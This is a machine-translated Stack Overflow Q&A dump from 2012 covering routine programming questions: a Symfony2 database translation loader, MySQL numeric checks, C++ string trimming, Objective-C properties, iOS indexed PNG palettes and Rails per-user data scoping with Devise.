> 首先，我们必须为语言管理创建数据库实体。就我而言，我创建了三个实体： Language 实体包含所有可用的语言（如*法语、英语、德语*）。
> 
> 第二个实体名为*LanguageToken*。它代表所有可用的语言标记。*令牌*实体表示 xliff 文件的源*标记*。每个可用的可翻译文本都是一个标记。例如，我使用*home_page*作为标记，它在法语中被翻译为*Page principale ，在英语中被翻译为**Home page*。
> 
> 最后一个实体是*LanguageTranslation*实体：它包含特定语言的标记的翻译。在下面的示例中，*Page principale*是语言*法语*和令牌*home_page的**LanguageTranslation*实体。
> 
>  **这是非常低效的，但是翻译被 Symfony 2 缓存在一个文件中，最后它在 Symfony 2 第一次执行时只使用一次（除非你删除 Symfony 2 的缓存文件）。
> 
> *语言*实体的代码在这里可见：
> 
> ```
> /**
>  * @ORM\Entity(repositoryClass="YourApp\YourBundle\Repository\LanguageRepository")
>  */
> class Language {
> 
>     /**
>      * @ORM\Id 
>      * @ORM\Column(type="integer")
>      * @ORM\GeneratedValue
>      */
>     private $id;
> 
>     /** @ORM\column(type="string", length=200) */
>     private $locale;
> 
>     /** @ORM\column(type="string", length=200) */
>     private $name;
> 
>     public function getId() {
>         return $this->id;
>     }
> 
>     public function setId($id) {
>         $this->id = $id;
>     }
> 
>     public function getLocale() {
>         return $this->locale;
>     }
> 
>     public function setLocale($locale) {
>         $this->locale = $locale;
>     }
>     public function getName() {
>         return $this->name;
>     }
> 
>     public function setName($name) {
>         $this->name = $name;
>     }
> } 
> ```
> 
> *LanguageToken*实体的代码在这里可见：
> 
> ```
> /**
>  * @ORM\Entity(repositoryClass="YourApp\YourBundle\Repository\LanguageTokenRepository")
>  */
> class LanguageToken {
> 
>     /**
>      * @ORM\Id @ORM\Column(type="integer")
>      * @ORM\GeneratedValue
>      */
>     private $id;
> 
>     /** @ORM\column(type="string", length=200, unique=true) */
>     private $token;
> 
>     public function getId() {
>         return $this->id;
>     }
> 
>     public function setId($id) {
>         $this->id = $id;
>     }
> 
>     public function getToken() {
>         return $this->token;
>     }
> 
>     public function setToken($token) {
>         $this->token = $token;
>     }
> } 
> ```
> 
> *LanguageTranslation*实体的代码在这里可见：
> 
> ```
> /**
>  * @ORM\Entity(repositoryClass="YourApp\YourBundle\Repository\LanguageTranslationRepository")
>  */
> class LanguageTranslation {
> 
>     /**
>      * @ORM\Id @ORM\Column(type="integer")
>      * @ORM\GeneratedValue
>      */
>     private $id;
> 
>     /** @ORM\column(type="string", length=200) */
>     private $catalogue;
> 
>     /** @ORM\column(type="text") */
>     private $translation;
> 
>     /**
>      * @ORM\ManyToOne(targetEntity="YourApp\YourBundle\Entity\Language", fetch="EAGER")
>      */
>     private $language;
> 
>     /**
>      * @ORM\ManyToOne(targetEntity="YourApp\YourBundle\Entity\LanguageToken", fetch="EAGER")
>      */
>     private $languageToken;
> 
>     public function getId() {
>         return $this->id;
>     }
> 
>     public function setId($id) {
>         $this->id = $id;
>     }
> 
>     public function getCatalogue() {
>         return $this->catalogue;
>     }
> 
>     public function setCatalogue($catalogue) {
>         $this->catalogue = $catalogue;
>     }
> 
>     public function getTranslation() {
>         return $this->translation;
>     }
> 
>     public function setTranslation($translation) {
>         $this->translation = $translation;
>     }
> 
>     public function getLanguage() {
>         return $this->language;
>     }
> 
>     public function setLanguage($language) {
>         $this->language = $language;
>     }
> 
>     public function getLanguageToken() {
>         return $this->languageToken;
>     }
> 
>     public function setLanguageToken($languageToken) {
>         $this->languageToken = $languageToken;
>     }
> } 
> ```
> 
> ## 实现加载器接口
> 
> 第二步是创建一个实现*Symfony\Component\Translation\Loader\LoaderInterface*的类。相应的类如下所示：
> 
> ```
> class DBLoader implements LoaderInterface{
>     private $transaltionRepository;
>     private $languageRepository;
> 
>     /**
>      * @param EntityManager $entityManager
>      */
>     public function __construct(EntityManager $entityManager){
>         $this->transaltionRepository = $entityManager->getRepository("AppCommonBundle:LanguageTranslation");
>         $this->languageRepository = $entityManager->getRepository("AppCommonBundle:Language");
>     }
> 
>     function load($resource, $locale, $domain = 'messages'){
>         //Load on the db for the specified local
>         $language = $this->languageRepository->getLanguage($locale);
> 
>         $translations = $this->transaltionRepository->getTranslations($language, $domain);
> 
>         $catalogue = new MessageCatalogue($locale);
> 
>         /**@var $translation Frtrains\CommonbBundle\Entity\LanguageTranslation */
>         foreach($translations as $translation){
>             $catalogue->set($translation->getLanguageToken()->getToken(), $translation->getTranslation(), $domain);
>         }
> 
>         return $catalogue;
>     }
> } 
> ```
> 
> DBLoader类需要拥有来自*LanguageTranslationRepository* *（* translationRepository 成员）的*所有翻译*。*translationRepository*对象的*getTranslations($language, $domain)*方法在这里可见：
> 
>  *```
> class LanguageTranslationRepository extends EntityRepository {
> 
>     /**
>      * Return all translations for specified token
>      * @param type $token
>      * @param type $domain 
>      */
>     public function getTranslations($language, $catalogue = "messages"){
>         $query = $this->getEntityManager()->createQuery("SELECT t FROM AppCommonBundle:LanguageTranslation t WHERE t.language = :language AND t.catalogue = :catalogue");
>         $query->setParameter("language", $language);
>         $query->setParameter("catalogue", $catalogue);
> 
>         return $query->getResult();
>     }
>     ...
> } 
> ```
> 
> DBLoader类*将由*Symfony 作为服务创建，接收*EntityManager*作为构造函数参数。*load*方法的所有参数都允许您自定义翻译加载器接口的工作方式。
> 
> ## 使用 DBLoader 创建 Symfony 服务
> 
> 第三步是使用之前创建的类创建服务。添加到 config.yml 文件的代码在这里：
> 
> ```
> services:
>     translation.loader.db:
>         class: MyApp\CommonBundle\Services\DBLoader
>         arguments: [@doctrine.orm.entity_manager]
>         tags:
>             - { name: translation.loader, alias: db} 
> ```
> 
> transation.loader标签指示 Symfony 使用这个翻译加载器作为*db**别名*。
> 
> ## 创建假翻译文件
> 
> 最后一步是为每个翻译创建一个*app/Resources/translations/messages.xx.db*文件（其中 xx = en、fr、de、...）。
> 
> 我没有找到通知 Symfony 使用*DBLoader*作为默认翻译加载器的方法。我发现的唯一快速破解方法是创建一个*app/Resources/translations/messages.en.db*文件。*db*扩展名对应于服务声明中使用的db*别名*。为网站上可用的每种语言创建一个相应的文件，例如*messages.fr.db*用于法语或*messages.de.db*用于德语。
> 
> 当 Symfony 找到*messages.xx.db*文件时，他加载*translation.loader.db*来管理这个未知的扩展，然后*DBLoader*使用数据库内容来提供翻译。
> 
> 我也没有找到正确清理数据库修改时的翻译缓存的方法（必须清理缓存以强制 Symfony 重新创建它）。我实际使用的代码在这里可见：
> 
> ```
> /**
>  * Remove language in every cache directories
>  */
> private function clearLanguageCache(){
>     $cacheDir = __DIR__ . "/../../../../app/cache";
> 
>     $finder = new \Symfony\Component\Finder\Finder();
> 
>     //TODO quick hack...
>     $finder->in(array($cacheDir . "/dev/translations", $cacheDir . "/prod/translations"))->files();
> 
>     foreach($finder as $file){
>         unlink($file->getRealpath());
>     }
> } 
> ```
> 
> 这个解决方案不是最漂亮的（如果我找到更好的解决方案，我会更新这篇文章）但它正在工作^^
> 
> 善于交际，分享！***

 *** * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T03:21:28.040

看看Doctrine 2的[Translatable 行为扩展](https://github.com/l3pp4rd/DoctrineExtensions/blob/master/doc/translatable.md)[。StofDoctrineExtensionsBundle](https://github.com/stof/StofDoctrineExtensionsBundle)将它与 Symfony 集成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-03T12:32:04.213

您可能想使用 PDO 连接查看此 Loader + Resource：[https ://gist.github.com/3315472](https://gist.github.com/3315472)

然后你只需要让它感知缓存，比如在两者之间添加一个 memcache、apc、..。如果是这样，您可以禁用翻译器本身的文件缓存。**

# visual-studio-2010 - 如果链接文本包含单词“google”，VS 2010 WCAG 13.1 错误

> ID：10220207
> 
> 赞同：2
> 
> 时间：2012-04-19T00:54:07.377
> 
> 标签：visual-studio-2010

在 Visual Studio 和 Web Developer 2010 中，如果您启用可访问性检查，当您的链接文本中的任何位置包含单词“google”时，您会收到以下错误（不仅仅是警告）：

> WCAG 13.1：清楚地识别链接的目标。不要使用“点击这里”。使用描述性的东西，例如“校园地图”。

我知道这很有趣，但很遗憾是真的，虽然它实际上并没有阻止编译 - 当没有其他错误时它有点让人眼花缭乱，坦率地说，当你必须滚动查看真正的错误时非常烦人。我知道 MS 讨厌谷歌 ;-) 但有人知道如何让 VS 忽略这一点吗？

# node.js - node.js http.connections

> ID：10220208
> 
> 赞同：1
> 
> 时间：2012-04-19T00:54:08.923
> 
> 标签：node.js

我正在查看 node.js 代码并且无法理解其中的一些。请帮帮我。

```
var http = require("http"),
server = http.createServer(function(req,res) {});
......
if(MaxUserCheck <1 ){
server.watcher.stop();
logmsg(level1, server.connections);
} 
```

对于上面的代码，什么是“watcher”，如何使用呢？“server.connections” - 这是什么？以及如何使用它？

我已经看到使用服务器模块作为

```
server.on('request', function (req,res){};
...
server.listen(52273, function(){}; 
```

我可以理解如上，但使用“server.connections”无法理解，也没有看到它像那样使用。

我查阅了 node.js 手册，但没有解释它。（http://nodejs.org/api/）似乎“server.connections”返回了多少客户端连接到我们的服务器..（服务器使用 Fugue多客户端）我在哪里可以找到“server.connections”和“server.watcher”的用法

谢谢你。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2017-03-31T13:08:47.717

这两种语法可能已在其他目录中使用/需要。如果我将此模块导出到另一个文件并在那里说 require('watcher') ，它将起作用。但是我不确定使用的是什么观察器，但它可能是[webwatcher](https://github.com/Seikho/watcher/blob/master/readme.md)模块。

# jquery - IE9 在 jquery 文件更改事件上崩溃

> ID：10220210
> 
> 赞同：0
> 
> 时间：2012-04-19T00:54:34.660
> 
> 标签：jquery, asp.net, internet-explorer

这是我的html代码

```
 <div class="s-field" id="fileBox">
    <div style="display: block; width: 100px; height: 20px; overflow: hidden;">
      <button style="width: 110px; height: 30px; position: relative; top: -5px; left: -5px;"
                                    title="Upload File">
                                    Upload File
       </button>
       <asp:FileUpload runat="server" ID="upload_input" CssClass="file" ClientIDMode="Static"
                                    Style="font-size: 50px; width: 120px; opacity: 0; filter: alpha(opacity: 0);
                                    position: relative; top: -40px; left: -20px" />
     </div>
 </div> 
```

我的jQuery

```
$('#upload_input').change(function (e) {

    var n = $(this).val();
   // alert(n); << if i comment out this alert it crashes the IE9

    var name = n.split('\\');
    var filename = name[name.length - 1];
    $('#fileBox').hide();
    $('#fileValue').html(filename);
    $('#fileValueDiv').show();

}); 
```

如果我注释掉警报语句，它会使 IE9 崩溃。其他浏览器没问题。![在此处输入图像描述](../Images/f0a46ea1397186751dd4ad7c0a06c1f1.png)
我不知道是什么原因。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:00:49.810

试着把

```
window.alert = null ; 
```

在您的 javascript 顶部并取消注释警报，它应该可以正常工作。请注意，这只是一种解决方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-12T17:39:59.667

我假设你的代码在`$('document').ready(function() { ...thingymajiggy...});`

否则它可能是您安装中的其他内容。在其他电脑上尝试新的 E9 实例

# java - Java .jar 文件将在命令行中运行，但在单击时不会

> ID：10220211
> 
> 赞同：2
> 
> 时间：2012-04-19T00:54:45.503
> 
> 标签：java, cmd, executable-jar

我知道执行 .jar 文件的问题之前已经介绍过（因为我在发布之前已经阅读并搜索了几个线程）但是这个*有点*不同。我的 .jar 在被击中时运行，

```
java -jre [Jar Name].jar 
```

但是当我点击它时它不会运行。

好的，所以我目前在 JDK 1.6.0_30 上运行。输入，

```
java -version 
```

进入 cmd 提供了这么多，并且所有有问题的代码都是在该 JDK 下编译的。此外，在我的环境变量中，“路径”指向

```
C:\Program Files\Java\jdk1.6.0_30\\bin; 
```

所以这也很好。

认为这是我的计算机如何识别 .jar 文件的问题，我输入，

```
ftype|find "jarfile" 
```

但这也似乎很好，因为它解决了，

```
"C:\Program Files\Java\jre6\bin\javaw.exe" -jar "%1" %* 
```

我相信这是它应该做的。

我的代码不会终止，除非用户输入它来这样做，所以我知道问题不在于我的代码正在运行，然后在完成后关闭命令行。它根本不会打开 cmd 或错误。我在这里忽略了 .jar 文件和 Java 的其他什么麻烦？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T03:39:18.247

根据我的经验，当我在 Windows 7 中双击它们时，我强制运行 .jar 文件：

1.  右键单击 .jar 文件，选择“打开方式”上下文菜单选项
2.  浏览并选择 java.exe 作为打开 .jar 文件的进程
3.  选中“始终使用所选程序打开此类文件”选项，以便将来我双击 .jar 文件时执行它。

同样，我已经完成了相同的过程，但选择使用 Zip 实用程序（例如，7-Zip）打开 .jar 文件，以便将我的 .jar 文件视为 .zip 文件，因为 99% 我想要检查其内容而不是运行它们。

# mysql - MySQL：如何检查提供的值是数字/整数还是字母？

> ID：10220215
> 
> 赞同：1
> 
> 时间：2012-04-19T00:55:12.837
> 
> 标签：mysql, sql, php-5.3

如何检查提供的值是数字/整数还是字母？

例如，这是我的工作 SQL，

```
SELECT 
    p.*

FROM page AS p

WHERE p.title = 'home'

AND IF(CONVERT('7', SIGNED INTEGER) IS NOT NULL, p.parent_id != p.page_id, p.parent_id = p.page_id) 
```

' **7** '是可变的，有时是数字，有时是' **self** '。

所以当它是一个数字时，那么`p.parent_id != p.page_id`

别的`p.parent_id = p.page_id`

但是我可以做对，因为我的 SQL 查询总是返回 `p.parent_id != p.page_id`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:58:30.983

您可以使用[`REGEXP`.](http://dev.mysql.com/doc/refman/5.1/en/regexp.html)

```
AND CASE
    WHEN ('7' REGEXP '^[0-9]+$') THEN
      p.parent_id != p.page_id
    ELSE p.parent_id = p.page_id
END 
```

您`CONVERT()`无法按预期工作的原因是非数字字符串将始终被强制转换为 0，而不是 NULL。

```
mysql> SELECT CONVERT('7a', SIGNED INTEGER);
+-------------------------------+
| CONVERT('7a', SIGNED INTEGER) |
+-------------------------------+
|                             7 |
+-------------------------------+

mysql> SELECT CONVERT('self', SIGNED INTEGER);
+---------------------------------+
| CONVERT('self', SIGNED INTEGER) |
+---------------------------------+
|                               0 | <-- non-numeric strings always cast to 0
+---------------------------------+ 
```

如果您与 0 而不是 NULL 进行比较，您的方法可能会起作用，但我没有很好的测试方法。但是，如果该值实际上是 0，这将失败，您将得到错误的比较结果。

```
AND IF(CONVERT('7', SIGNED INTEGER) <> 0, p.parent_id != p.page_id, p.parent_id = p.page_id) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:01:49.787

[http://dev.mysql.com/doc/refman/5.1/en/regexp.html](http://dev.mysql.com/doc/refman/5.1/en/regexp.html)

```
WHERE 
     '7' REGEXP '[[:digit:]]+' AND p.parent_id != p.page_id 
  OR '7' REGEXP '[[:alpha:]]+' AND p.parent_id = p.page_id 
```

或更优

```
WHERE 
     '7' REGEXP '[[:digit:]]+' AND p.parent_id != p.page_id 
  OR '7' = 'self'              AND p.parent_id = p.page_id 
```

假设由mysql隐式`1`转换为`TRUE`和`0`to 。`FALSE`

# c++ - 迭代，找到

> ID：10220216
> 
> 赞同：4
> 
> 时间：2012-04-19T00:55:17.017
> 
> 标签：c++, string, iterator, iteration

请帮忙！我将如何通过迭代查看字符并在有效字符出现之前计算下划线的数量来查找和删除前导下划线。以及从字符串末尾向后迭代以查找任何尾随下划线。

我可以使用以下方法来擦除下划线，但是如何迭代来查找下划线。

```
resultF.erase(resultF.length()- trailingCount);
resultF.erase(0,leadingCount); 
```

如果用户输入字符串**___twenty_three__**，最终结果应该是 20_3。所以只有前导和尾随下划线被删除。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:05:06.493

像这样的东西应该使用字符串库的[find_first_not_of](http://www.cplusplus.com/reference/string/string/find_first_not_of/)和[find_last_not_of](http://www.cplusplus.com/reference/string/string/find_last_not_of/)。这些页面上有很棒的代码示例。

```
// From the links above: 
#include <iostream>
#include <string>
using namespace std;

int main ()
{
  string str ("erase trailing white-spaces   \n");
  string whitespaces (" \t\f\v\n\r");
  size_t found;

  found=str.find_last_not_of(whitespaces);
  if (found!=string::npos)
    str.erase(found+1);
  else
    str.clear();            // str is all whitespace

  cout << '"' << str << '"' << endl;

  return 0;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:11:07.350

这些线上的东西

```
string remove_(const string& str) {
  int i,j;
  int n = str.length();
  for(i=0;i < n && (str[i] != '_');i++);
  for(j=n;j > 0 && (str[j-1] != '_');j--);
   if(j <= i)
      return string(); //all underscores
  return ((str).substr(i,j-i));
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T01:05:13.957

前导字符的伪代码：

```
std::string *str;
int ct = 0;

while(*str != '_'){
str++;
ct++;
}

For trailing characters:

while (* (str+length) != '_') {
str--;
ct++;
} 
```

# iphone - ios 目标 C Bool 未设置

> ID：10220217
> 
> 赞同：3
> 
> 时间：2012-04-19T00:55:21.743
> 
> 标签：iphone, objective-c, ios, boolean

我正在创建一个自定义 UITextField，但没有设置 BOOL？

MyCustomTextField.h

```
#import <UIKit/UIKit.h>

@interface OMTextField : UIControl <UITextFieldDelegate>

{
    UITextField *_theTextField;

    BOOL _hasBackGroundImage;
}

@property (nonatomic, retain)UITextField *theTextField;
@property (nonatomic) BOOL hasBackGroundImage;

@end 
```

MyCustomTextField.m

```
#import "OMTextField.h"

@implementation OMTextField

@synthesize theTextField = _theTextField;
@synthesize hasBackGroundImage = _hasBackGroundImage;

- (void)dealloc 
{
    [_theTextField release];
    [super dealloc];
}

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code

        self.theTextField = [[[UITextField alloc]initWithFrame:CGRectMake(0, 0, frame.size.width, frame.size.height)]autorelease];
        //self.theTextField.borderStyle = UITextBorderStyleLine;
        self.theTextField.text = @"textField";
        self.theTextField.delegate = self;

        if (self.hasBackGroundImage) {
            NSLog(@"lo tienes");
        }
    if (!self.hasBackGroundImage) {
        NSLog(@"nana tienes");
    }

        [self addSubview:self.theTextField];

    }
    return self;
}

/*
// Only override drawRect: if you perform custom drawing.
// An empty implementation adversely affects performance during animation.
- (void)drawRect:(CGRect)rect
{
    // Drawing code
}
*/

@end 
```

以及我的 MainVC 中的调用：

```
MyCustomTextField *textField = [[[MyCustomTextField alloc]initWithFrame:CGRectMake(400, 160, 150, 40)]autorelease];

    textField.hasBackGroundImage = YES;

    textField.backgroundColor = [UIColor grayColor];
    textField.theTextField.borderStyle = UITextBorderStyleLine;

    [self.view addSubview:textField]; 
```

所以它显示得很好，但是正如你所看到的那样设置 `textField.hasBackGroundImage = YES;`

但是在执行时，我看到了 BOOL = NO?? 的消息

```
nana tienes 
```

那么我错过了什么？，为什么这没有被评估为是？

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-19T01:03:58.257

您已将 NSLog 放在 initWithFrame 方法中。这在设置 textField.hasBackGroundImage 之前的行上调用，此时该值仍为 NO。

如果您想查看设置此值，请将以下方法添加到 MyCustomTextField：

```
- (void)setHasBackGroundImage:(BOOL)flag
{
    _hasBackGroundImage = flag;
} 
```

然后在这个方法上放一个断点。您应该会在设置后立即看到它。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-19T01:03:21.847

您正在调用`initWithFrame:`，它会打印“nana tienes”，因为 a 的默认值为`BOOL`（`FALSE`或`NO`）。然后，您将其设置为`YES` *after*。

如果在将其设置为 后进行测试`YES`，它将打印“lo tienes”。

# css - 强制缓存导入的 CSS 文件？

> ID：10220221
> 
> 赞同：1
> 
> 时间：2012-04-19T00:56:07.577
> 
> 标签：css, caching, import

我有一个在我的网站中调用的 css 文件，名为 basic.css。

在这个文件中，我有 2 个从另一台服务器导入的包含大型 Base64 编码字体的 css 文件。

（在任何人问它必须是这样之前......它都连接到使用CKEditor的CP，所以CSS结构必须像这样才能在任何地方工作）

一切都运行良好，除了在网站中导航时，它似乎没有缓存导入的 css 文件，因此页面加载时间非常糟糕。

网络上充满了防止缓存的解决方案，但我似乎找不到任何强制执行它的方法！这些导入的文件真的永远不会改变，所以如果它们缓存它不是问题.. 它肯定会使网站加载更快（虽然我在缓存方面不是天才，所以请原谅我的无知）。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T00:58:38.463

没有缓存 css 是链接 css 文件的缺点。

# javascript - 你将如何实现这样的导航？

> ID：10220225
> 
> 赞同：-4
> 
> 时间：2012-04-19T00:57:10.697
> 
> 标签：javascript, html, css, navigation

你将如何实现这样的导航？

![](../Images/3e5f4fc0802557654a816cb4af8c2688.png)

我有点卡住了，想知道是否有人可以指出我实现这一目标的好方法。

这是悬停状态之一的透明 PNG。

![](../Images/4da19fdc603970910dcd35a28b95964d.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T01:02:41.677

您的基本链接组是`<ul>`

```
<ul id="links">
    <li class="current"> <!--apply class "current" for current link-->
        <a>link1</a>
    </li> 
    <li>
        <a>link2</a>
    </li>
</ul> 
```

对标签进行一些修改以`<a>`获得更好的用户体验

```
#links a {
   display:block;     /*to make `<a>` not inline*/
   padding:           /*make the link hover/click area bigger*/
   text-align: right; /*the right-aligned text*/
} 
```

现在对于css，将您的“方形指示器”应用于`<a>` ~~“当前”的背景`<li>`。你也可以这样做~~（对于旧浏览器，悬停不适用于非`<a>`元素）

```
li.current a{
    background-image:url(url_to_square_indicator);
    background-position: middle right; 
    /*
      you can use position to refine it's position.
      im not so sure about this if this "middle right" 
      is still applicable these days
    */
} 
```

如果您将鼠标悬停在当前链接上，请使用`:hover`. 您不需要重新声明以前应用的样式，它们只是延续。你只是换出图像。（在这种情况下，背景位置仍然适用）

```
li.current a:hover{
    background-image:url(url_to_glowing_indicator);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:59:38.853

如果我不得不猜测，我会说 :hover 改变背景，因为它是一个图像文件。还要确保设置背景位置和重复，以便它只出现在那里。

# c - 从 2D 函数制作 3D perlin 噪声函数

> ID：10220226
> 
> 赞同：0
> 
> 时间：2012-04-19T00:57:15.250
> 
> 标签：c, opengl, noise, perlin-noise

因此，我正在尝试使用 openGL 绘制随时间变化的抽象形状。为此，我想使用 Perlin 噪声函数。这段代码（[http://www.sorgonet.com/linux/noise_textures/](http://www.sorgonet.com/linux/noise_textures/)）对我来说是一个完美的开始，除了这里找到的函数只需要两个坐标。我想要一个需要两个空间坐标的，第三个会随时间变化的。

我的问题是：是否可以调整此功能以使用更多坐标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:10:24.840

对的，这是可能的。

您可以将时间维度视为空间维度，没有任何问题。

对于 2D 噪声，您将使用像这样的 2D 插值，以双线性为例，但这个想法应该适用于双三次等：

第一步：

您有 4 个外部值，其中一个点可以获取其值。

```
+    +

  x

+    + 
```

第二步：

在 Y 轴上插值。

```
+-+--+

  x

+-+--+ 
```

第三步：

在 Y 轴上插值。

```
+-+--+
  |
  x
  |
  |
+-+--+ 
```

现在我们有了插值。

现在，要添加第三个维度，我们从 8 个值开始并添加一个额外的步骤：在 Z 轴上插值。这将扩展到任意多个维度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:59:47.747

3d perlin 噪声呢？ [http://webstaff.itn.liu.se/~stegu/aqsis/DSOs/DSOnoises.html](http://webstaff.itn.liu.se/~stegu/aqsis/DSOs/DSOnoises.html)

为您的几何图形使用 2 个坐标，一个用于时间。

# ios - 如何在 iOS 上运行时修改索引 PNG 的调色板？

> ID：10220240
> 
> 赞同：1
> 
> 时间：2012-04-19T00:59:48.263
> 
> 标签：ios, xamarin.ios, png, core-graphics, cgcolorspace

我有一系列 PNG 图像，它们使用颜色调色板中的索引（PNG 颜色类型 3）。在某些情况下，我需要制作一个图像副本，其中修改了调色板中的某些条目。通过这种方式，我们一遍又一遍地重新着色源 PNG。

在 Java 中，这是通过从 中获取 RGB 值`IndexedColorModel`、修改值并创建一个新的`IndexedColorModel`，并`BufferedImage`使用源图像的光栅数据和新的颜色模型创建一个新的来处理的。

在 Actionscript 中，我必须读取 PNG 字节作为裸`ByteArray`.，找到调色板块，修改值，然后让运行时从`ByteArray`.

我现在希望通过 MonoTouch（我是新手）为 iOS 实现相同的系统，但我碰壁了。我相信 Actionscript 方法也可以在这里工作，但这次最好避免在如此低的级别上工作，而且看起来我可以接近。

如果我从 a 开始`UIImage`，我可以使用`UIImage.CGImage.ColorSpace`. 我可以验证它是一个带有索引的颜色模型`colorSpace.Model`。我不确定的是如何获得调色板字节的实际数组。

然后另一方面，如何使用新调色板创建新图像？`CGImage.WithColorSpace`看起来它会做我想要的......也许？然后我必须能够用我的新调色板创建一个色彩空间：表面上`CGColorSpace.CreateIndexed`看起来像我想要的，但我不清楚`baseSpace`参数是如何使用的。我想`CGColorSpace`用我提供的全新调色板创建一个，然后将原始图像的索引与新调色板一起使用。也许我误解了确切`CGColorSpace`的用途。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T13:25:30.633

> 在 Actionscript 中，我必须将 PNG 字节作为裸 ByteArray 读取，找到调色板块，修改值，然后让运行时从 ByteArray 加载图像。

这有点粗鲁，但它会工作。但是，我很确定 CoreGraphics 拥有避免这种情况所需的一切。

> 如果我从 UIImage 开始

由于无论如何您都将使用 CoreGraphics (CG)，因此您可以从`CGImage`. 此处的示例代码 (objc)：[iPhone SDK：访问索引颜色 PNG 图像](https://stackoverflow.com/questions/3251595/iphone-sdk-accessing-indexed-color-png-images)

> 我不确定的是如何获得调色板字节的实际数组。

[`CGColorSpaceGetColorTable`](https://developer.apple.com/documentation/coregraphics/1408853-cgcolorspacegetcolortable)看起来是完美的候选人。然而，MonoTouch 绑定似乎缺少它（我会检查一下），但手动绑定并在您的应用程序中使用会很容易（它是 ap/invoke）。

> 但我不清楚如何使用 baseSpace 参数

[`CGColorSpace.CreateIndexed`](https://developer.apple.com/documentation/coregraphics/1408899-cgcolorspacecreateindexed)可以接受`null`参数，`baseSpace`但您最好从原始 PNG 图像中复制相同的基本 GCColorSpace。

# ruby-on-rails - ruby on rails 将用户仅限于特定数据

> ID：10220245
> 
> 赞同：2
> 
> 时间：2012-04-19T01:00:08.273
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我想限制用户只能查看和编辑来自他们公寓的数据。我已经在 session[:apartment_id] 中保存了他们的 apartment_id。所以，我有 CRUD，我想限制用户不能做 /data/ID/edit 只能更改 ID 然后编辑数据。有没有一种很好的方法可以做到这一点，比如说，通过一些范围，或者我必须在每个操作中验证我的控制器中的所有内容。先感谢您。多里扬

编辑：这是更详细的：假设有一个用户列表何时执行 /data 并且当您想查看有关某些具有 ID 的用户的特定数据时，您将转到 /data/ID 示例 /data/27。在我的数据库中，对于模型数据，我得到了 row apartment_id，它告诉用户属于哪个公寓。

现在，我想根据他们的会话数据限制某些用户的视图。例如，当用户登录时，他得到了 session[:apartment_id]。

因此，我希望能够限制用户不能访问例如 /data/34 的 user_id=34，它的公寓 ID 与会话 [：公寓 ID] 不同。

另外，当用户访问/data 时，只向用户显示他的表象。

我知道我可以在每个控制器中执行此操作，每种方法都可以检查这一点，但是我可以在模型的某个地方执行此操作吗？谢谢你

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-03-15T21:11:35.993

**为 Rails 应用程序添加行级安全性** 如果您正在使用数据库构建 Web 应用程序，您可能需要多个用户，这意味着添加行级安全性和身份验证。

Rails 使用了一个很酷的 gem，叫做 Devise。Devise 创建一个 User 表和视图以通过会话向 Web 应用程序进行身份验证，然后您可以向每个视图添加身份验证以确保您有一个有效的会话来查看该视图。

这一切都很好，但并没有解决我的另一个问题，即按用户限制数据库中的数据。所以我选择使用 Devise User 模型，特别是 id 字段，并由其他数据库表更改以包含 id 字段（我称之为 user_id ）。当您随后调整 Rails 应用程序的其余部分（例如模型调用）以使用会话 user_id 作为每个 SQL 查询的一部分时，这一切都有效。让我尝试解释基本步骤，其中包含一些细节，但您需要针对您的情况即兴发挥。

我眼中的过程分为特定于设计的步骤和行级安全步骤。

**设计步骤**

将设计添加到您的 Rails 项目

```
 add devise gem to gem file

    gem ‘devise’

    bundle install

rails generate devise:install 
```

（将设计安装到 Rails 应用程序中 - 位于应用程序目录根目录中）

```
rails g devise:views 
```

（可选步骤：这会复制视图，以便我们可以自定义和样式）

```
rails generate devise User 
```

（创建用户模型）

```
bundle exec rake db:migrate 
```

（创建表 - 注意您需要 yml 中的权限才能更改数据库结构）

**其余与设计相关的步骤**

添加顶部 div 到 application.html.erb 检查用户是否登录，并显示登录 ID 或新用户和登录链接

```
<div class=”top”&gt;

<p class=”notice”&gt;<%= notice %></p>

<p class=”alert”&gt;<%= alert %></p>

<p>

<% if user_signed_in? %>

  Logged in as <strong><%= current_user.email %></strong>.

  <%= link_to ‘Edit profile’, edit_user_registration_path %> |

  <%= link_to “Logout”, destroy_user_session_path, method: :delete  %>

<% else %>

  <%= link_to “Sign up”, new_user_registration_path  %> |

  <%= link_to “Login”, new_user_session_path %>

<% end %>

</div> 
```

创建了一个“访客”控制器并在未登录时显示 - 还更新了 routes.rb 以使其成为根 - 即，当有人第一次访问您的站点时，您应该将他们带到访客控制器，而不是数据！您还没有会话。

更新了来宾/根控制器，特别是如果用户已登录，则索引操作以转到已登录的控制器

```
 if user_signed_in?

    redirect_to :controller=>’home’, :action=> ‘index’

  end 
```

在每个其他 data/loggedin 控制器中，将以下内容添加到控制器顶部的操作之前：这将确保没有人可以使用 URL 路径在未经身份验证的情况下登陆页面。

```
before_filter :authenticate_user! 
```

**行级步骤**

使用 user_id 列更改您想要行级安全性“RLS”的表。

```
mysql> ALTER TABLE mytable ADD COLUMN user_id VARCHAR(255) AFTER id; 
```

